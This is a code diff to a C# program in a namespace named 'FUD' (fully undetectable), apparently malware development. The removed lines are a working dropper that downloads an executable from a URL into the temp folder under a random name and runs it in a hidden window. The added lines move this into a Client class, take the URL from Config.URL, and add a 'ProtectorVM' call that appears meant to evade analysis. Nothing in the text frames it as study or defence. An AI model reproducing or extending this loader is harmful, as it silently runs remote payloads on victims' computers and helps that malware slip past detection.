@@ -8,39 +8,14 @@ namespace FUD
 {
     class Program
     {
+        private static Client _client = new Client();
+        private static ProtectorVM _protector = new ProtectorVM();
         static void Main(string[] args)
         {
-            string url = ""; // Ссылка на файл
-            string FileLocate = FileName();
-
-            FileName();
-            Download(FileLocate, url);
-            Runprocess(FileLocate);
-        }
-
-        private static void Download(string FileLocate, string url)
-        {
-            WebClient client = new WebClient();
-            client.DownloadFile(new Uri(url), FileLocate + ".exe");
-        }
-
-        private static string FileName()
-        {
-            string Temp = Path.GetTempPath();
-            string Ran = Path.GetRandomFileName();
-            string FileLocate = Temp + Ran;
-            return FileLocate;
-        }
-
-        private static void Runprocess(string FileLocate)
-        {
-            Process process = new Process
-            {
-                StartInfo =
-                {
-                    FileName = FileLocate + ".exe", WindowStyle = ProcessWindowStyle.Hidden }
-            };
-            process.Start();
+            _protector.MoveThePointer();
+            string FileLocate = _client.FileName();
+            _client.Download(FileLocate, Config.URL);
+            _client.Runprocess(FileLocate);
         }
     }
 }
